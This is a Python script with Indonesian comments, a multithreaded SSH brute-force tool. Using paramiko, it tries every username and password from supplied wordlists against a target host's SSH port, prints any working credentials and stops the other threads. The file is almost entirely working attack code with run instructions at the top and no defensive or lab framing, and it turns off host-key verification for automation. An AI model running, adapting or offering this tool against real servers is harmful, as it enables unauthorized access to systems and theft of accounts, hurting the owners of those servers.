# cara run ehe
# python3 ssh_bruteforce.py <IP_TARGET> users.txt passwords.txt

# ssh_bruteforce.py
import paramiko
import time
import threading
import argparse

# Bendera global untuk memberi sinyal ke semua thread agar berhenti jika password ditemukan
stop_flag = threading.Event()
# Lock untuk memastikan output print tidak tumpang tindih
print_lock = threading.Lock()

def ssh_connect(host, port, username, password):
    """
    Mencoba untuk terhubung ke server SSH menggunakan username dan password tertentu.
    Mengembalikan True jika berhasil, False jika gagal.
    """
    if stop_flag.is_set():
        return False

    client = paramiko.SSHClient()
    # Peringatan: AutoAddPolicy secara otomatis menambahkan host key.
    # Ini tidak aman untuk penggunaan nyata karena rentan terhadap Man-in-the-Middle,
    # tetapi diperlukan untuk automasi skrip brute-force ini.
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Mencoba untuk terhubung
        client.connect(hostname=host, port=port, username=username, password=password, timeout=3)
        
        # Jika koneksi berhasil
        with print_lock:
            print(f"\n[+] BERHASIL! Kredensial ditemukan: ")
            print(f"    Host: {host}")
            print(f"    Username: {username}")
            print(f"    Password: {password}\n")
        stop_flag.set() # Memberi sinyal ke thread lain untuk berhenti
        return True
    except paramiko.AuthenticationException:
        # Kegagalan autentikasi (username/password salah)
        with print_lock:
            # Baris di bawah ini bisa di-uncomment jika Anda ingin melihat setiap kegagalan
            # print(f"[-] Gagal: {username}:{password}")
            pass
        return False
    except Exception as e:
        # Error lain (misal: host tidak terjangkau, koneksi ditolak)
        with print_lock:
            # print(f"[!] Error koneksi ke {host}: {e}")
            pass
        return False
    finally:
        client.close()

def main():
    parser = argparse.ArgumentParser(description="Python SSH Brute-Force Script")
    parser.add_argument("host", help="Alamat IP atau hostname target")
    parser.add_argument("user_file", help="File teks berisi daftar username")
    parser.add_argument("pass_file", help="File teks berisi daftar password")
    parser.add_argument("-p", "--port", type=int, default=22, help="Port SSH target (default: 22)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Jumlah threads paralel (default: 10)")

    args = parser.parse_args()

    # Membaca file username dan password
    try:
        with open(args.user_file, 'r') as f:
            usernames = [line.strip() for line in f.readlines()]
        with open(args.pass_file, 'r') as f:
            passwords = [line.strip() for line in f.readlines()]
    except FileNotFoundError as e:
        print(f"[!] Error: File tidak ditemukan - {e}")
        return

    print(f"[*] Memulai brute-force ke {args.host}:{args.port} dengan {args.threads} threads.")
    print(f"[*] Jumlah username: {len(usernames)}, Jumlah password: {len(passwords)}")
    
    # Mencoba setiap username dengan semua password
    for user in usernames:
        if stop_flag.is_set():
            break # Hentikan jika kredensial sudah ditemukan untuk user sebelumnya
            
        print(f"\n[*] Menguji untuk username: {user}")
        
        all_threads = []
        for password in passwords:
            if stop_flag.is_set():
                break

            # Tunggu jika jumlah thread aktif sudah mencapai batas
            while len(threading.enumerate()) > args.threads:
                time.sleep(0.1)

            thread = threading.Thread(target=ssh_connect, args=(args.host, args.port, user, password))
            thread.daemon = True # Thread akan berhenti jika program utama berhenti
            all_threads.append(thread)
            thread.start()

        # Tunggu semua thread untuk password list saat ini selesai
        for thread in all_threads:
            thread.join()

    if not stop_flag.is_set():
        print("\n[*] Brute-force selesai. Tidak ada kredensial yang ditemukan.")

if __name__ == "__main__":
    main()
